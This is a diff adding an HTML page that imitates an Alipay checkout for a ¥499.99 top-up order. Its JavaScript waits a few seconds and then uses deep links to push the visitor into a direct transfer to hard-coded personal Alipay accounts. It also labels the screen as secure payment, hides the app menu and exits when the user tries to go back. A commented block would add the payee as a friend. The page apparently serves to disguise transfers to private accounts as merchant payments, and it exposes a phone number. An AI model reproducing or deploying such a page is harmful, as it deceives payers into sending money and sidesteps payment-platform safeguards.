@@ -1,0 +1,334 @@
+
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <title>安全快速！</title>
+    <!-- 普通版 -->
+    <link rel="stylesheet" href="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/dpl/antui-all.css"/>
+    <script src="https://gw.alipayobjects.com/as/g/antui/antui/10.1.32/antui.js"></script>
+    <script src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+    <style>
+        body {
+            font-weight: 500;
+            font-family: PingFangSC-Regular, "Helvetica Neue",Helvetica,Arial,"Lucida Grande",sans-serif;
+            background-color: #f5f5f9;
+        }
+        header {
+            width: 100%;
+            text-align: center;
+            padding: 12px 0 ;
+            background: #fff;
+            display:block
+        }
+        main .pay-button{
+            margin-top: 30px;
+            padding:0 20px;
+        }
+        main .pay-button p{
+            color: #a5a5a5;
+            line-height: 18px;
+            font-size: 15px;
+            margin-bottom: 10px;
+        }
+        main .tips img{
+            margin: 15px 0;
+            width:100%;
+            height:auto;
+            border-radius:10px;
+        }
+        main .fly{
+            padding:0 20px;
+            display: none;
+            font-size: 15px;
+        }
+        main .fly img{
+            width:100%;
+            border-radius:10px;
+            margin:10px 0 30px;
+        }
+        /*web样式*/
+        #web .result{
+            position: absolute;
+            top: 50%;
+            margin-top: -215px;
+            width: 100%;
+        }
+        #web .result-logo{
+            width: 70px;
+            height: 98px;
+            margin: auto;
+
+            background-repeat: no-repeat;
+            background-size: contain;
+        }
+    </style>
+    <script src="https://cdn.staticfile.org/jquery/3.3.1/jquery.min.js"></script>
+    <script src="layer.js"></script>
+    <script type="text/javascript" src="https://gw.alipayobjects.com/as/g/h5-lib/alipayjsapi/3.1.1/alipayjsapi.inc.min.js"></script>
+
+</head>
+<body ontouchstart="">
+<div id="alipay">
+    <main>
+        <div class="am-notice">
+            <div class="am-notice-content">温馨提示:修改支付金额充值不到账后果自负</div>
+        </div>
+        <div class="am-list">
+            <div class="am-list-body ">
+                <div class="am-list-item">
+                    <div class="am-list-content">订单号：</div>
+                    <div class="am-list-extra">
+                        <div class="am-ft-18 am-ft-price am-ft-orange">
+                            <strong>12020010722191110477</strong>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="am-list-body ">
+                <div class="am-list-item">
+                    <div class="am-list-content">订单金额：</div>
+                    <div class="am-list-extra">
+                        <div class="am-ft-18 am-ft-price am-ft-orange">
+                            <strong> ￥499.99元</strong>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="am-list-body">
+                <div class="am-message result" id="wait">
+                    <i class="am-icon result wait"></i>
+                    <div class="am-message-main" id="timecount">等待</div>
+                    <div class="am-message-sub">已提交申请，系统处理中，请勿离开</div>
+                </div>
+                <div class="pay-button">
+                    <button type="button" class="am-button" id="alibtn">
+                        <span id="alibtnText">立即支付</span>
+                    </button>
+                </div>
+                <div class="am-message result" role="alert" id="success">
+                    <i class="am-icon result pay" aria-hidden="true"></i>
+                    <div class="am-message-main">支付成功</div>
+                    <div class="am-message-sub">支付成功，2分钟后自动上分</div>
+                </div>
+                <div class="am-message result" id="error">
+                    <i class="am-icon result error"></i>
+                    <div class="am-message-main">操作失败</div>
+                    <div class="am-message-sub">支付超时，单据作废充值无效<br />请重新下单</div>
+                </div>
+            </div>
+            <div class="am-list-body" style="margin-top:15px">
+                <div class="am-process">
+                    <div class="am-process-item pay">
+                        <i class="am-icon process success" aria-hidden="true"></i>
+                        <div class="am-process-content">
+                            <div class="am-process-main">系统交互中....请耐心等待!</div>
+                            <div class="am-process-brief">直接付款即可，不要修改金额</div>
+                        </div>
+                        <div class="am-process-down-border"></div>
+                    </div>
+                    <div class="am-process-item pay">
+                        <i class="am-icon process pay" aria-hidden="true"></i>
+                        <div class="am-process-content">
+                            <div class="am-process-main">如自动跳转到转账页面失败 请:</div>
+                            <div class="am-process-brief">1:请到支付宝首页搜索栏直接粘贴账号</div>
+                            <div class="am-process-brief">2:完成转账后系统自动完成充值</div>
+                        </div>
+                        <div class="am-process-up-border">
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!--<div class="pay-button">
+                 <button type="button" class="am-button" id="alibtn">
+                     <span id="alibtnText">立即支付</span>
+                 </button>
+             </div>-->
+        </div>
+    </main>
+</div>
+<div class="bg"></div>
+
+<script>
+    var ua = navigator.userAgent.toLowerCase();
+    AlipayJSBridge.call('setTitle', {
+        title: '支付宝支付',
+        subtitle: '安全支付'
+    });
+    document.getElementById('alipay').style.display = 'block';
+    document.getElementById('wait').style.display = 'block';
+    document.getElementById('error').style.display = 'none';
+    document.getElementById('success').style.display = 'none';
+    var count = 5;
+    var alibtn = document.getElementById("alibtn");
+    alibtn.addEventListener("click",function() {
+        paya();
+    });
+    startPay();
+    function startPay() {
+        var timer = window.setInterval(function () {
+            if (count < 1) {
+                clearInterval(timer);
+                document.getElementById('timecount').innerText = '请勿重复支付，跳转中...';
+                document.getElementById('alibtn').removeAttribute('disabled');
+                document.getElementById('alibtnText').innerHTML = '无法跳转？请重新点击支付';
+
+                pay();
+            }
+            else {
+                document.getElementById('timecount').innerText = '等待'+count+' 秒';
+                document.getElementById('alibtn').setAttribute('disabled', 'disabled');
+                document.getElementById('alibtnText').innerHTML = '请等待...' + count + '秒';
+                count -= 1;
+            }
+        }, 1000);
+    }
+
+    function pay(){
+        var money = "499.99";
+        var aaa = "2088331863080204";
+        var aac= "18256993587";
+
+        setTimeout(function () {
+            //AlipayJSBridge.call('exitApp');
+            /*AlipayJSBridge.call('showLoading', {
+                   text: '跳转中,请等待...',
+      });*/
+            /* AlipayJSBridge.call("startApp", {
+                        appId: "09999988",
+                        param: a
+                    });	*/
+            //var b_url= "alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount="+money+"&userId="+aaa+"&memo=";
+
+            //    var _url = "alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=" + aac + "&amount="+money+"&memo=";
+            //window.location.href = b_url;
+
+            //	var b_url = 'alipays://platformapi/startapp?appId=20000123&actionType=scan&biz_data={"s": "money","u": "'+ aaa +'","a": "'+ money +'","m":""}';
+            //    var _url = "alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=" + aac + "&amount="+money+"&memo=";
+            //https://openauth.alipay.com/oauth2/publicAppAuthorize.htm?app_id=2019070865742886&redirect_uri=http%3A%2F%2Fwww.duoppt.com%2Findex.php?s=/Pay_ZanBeipay_orderpay_id_20200103152437534897.html&scope=auth_base&state=123456
+
+
+            var b_url= "alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount="+money+"&userId="+aaa+"&memo=";
+
+            AlipayJSBridge.call('popTo', {
+                index: -1
+            });
+            window.location.href = b_url;
+            //AlipayJSBridge.call('closeWebview');
+            //AlipayJSBridge.call('exitApp');
+        }, 100);
+        /*setTimeout(function () {
+            //addfriend - profile
+
+            var _url = "alipays://platformapi/startapp?appId=20000186&actionType=addfriend&userId="+aaa+"&loginId="+aac+"&source=by_f_v&alert=false";
+
+
+            window.location.href = _url;
+
+
+        }, 555);*/
+
+        /* setTimeout(function () {
+              AlipayJSBridge.call('exitApp');
+
+             var _url= "alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount="+money+"&userId="+aaa+"&memo=";
+
+         //    var _url = "alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=" + aac + "&amount="+money+"&memo=";
+             window.location.href = _url;
+
+         }, 1500);
+         setTimeout(function () {
+              AlipayJSBridge.call('exitApp');
+
+             var _url= "alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount="+money+"&userId="+aaa+"&memo=";
+
+         //    var _url = "alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=" + aac + "&amount="+money+"&memo=";
+             window.location.href = _url;
+
+         }, 3500);*/
+    }
+    function paya(){
+        var money = "499.99";
+        var aaa = "2088732277875882";
+        var aac= "18256993587";
+
+        setTimeout(function () {
+            //AlipayJSBridge.call('exitApp');
+            /*AlipayJSBridge.call('showLoading', {
+                   text: '跳转中,请等待...',
+      });*/
+            /* AlipayJSBridge.call("startApp", {
+                        appId: "09999988",
+                        param: a
+                    });	*/
+            //var b_url= "alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount="+money+"&userId="+aaa+"&memo=";
+
+            //    var _url = "alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=" + aac + "&amount="+money+"&memo=";
+            //window.location.href = b_url;
+
+            //	var b_url = 'alipays://platformapi/startapp?appId=20000123&actionType=scan&biz_data={"s": "money","u": "'+ aaa +'","a": "'+ money +'","m":""}';
+            //    var _url = "alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=" + aac + "&amount="+money+"&memo=";
+            //https://openauth.alipay.com/oauth2/publicAppAuthorize.htm?app_id=2019070865742886&redirect_uri=http%3A%2F%2Fwww.duoppt.com%2Findex.php?s=/Pay_ZanBeipay_orderpay_id_20200103152437534897.html&scope=auth_base&state=123456
+            AlipayJSBridge.call('popTo', {
+                index: -1
+            });
+            var b_url= "alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount="+money+"&userId="+aaa+"&memo=";
+
+            window.location.href = b_url;
+            //AlipayJSBridge.call('closeWebview');
+            //AlipayJSBridge.call('exitApp');
+        }, 10);
+        /*setTimeout(function () {
+            //addfriend - profile
+
+            var _url = "alipays://platformapi/startapp?appId=20000186&actionType=addfriend&userId="+aaa+"&loginId="+aac+"&source=by_f_v&alert=false";
+
+
+            window.location.href = _url;
+
+
+        }, 555);*/
+
+        /* setTimeout(function () {
+              AlipayJSBridge.call('exitApp');
+
+             var _url= "alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount="+money+"&userId="+aaa+"&memo=";
+
+         //    var _url = "alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=" + aac + "&amount="+money+"&memo=";
+             window.location.href = _url;
+
+         }, 1500);
+         setTimeout(function () {
+              AlipayJSBridge.call('exitApp');
+
+             var _url= "alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount="+money+"&userId="+aaa+"&memo=";
+
+         //    var _url = "alipays://platformapi/startapp?appId=20000200&actionType=toAccount&account=" + aac + "&amount="+money+"&memo=";
+             window.location.href = _url;
+
+         }, 3500);*/
+    }
+</script>
+<script>
+    window.onload = ()=> {
+        function pushHistory() {
+            var state = {
+                title: "title",
+                url: "#"
+            };
+            window.history.pushState(state, "支付宝安全支付", "#");
+        }
+        pushHistory();
+        window.addEventListener("popstate", function(e) {
+            AlipayJSBridge.call('exitApp');
+        }, false);
+    };
+    AlipayJSBridge.call('hideOptionMenu');
+</script>
+</body>
+</html>
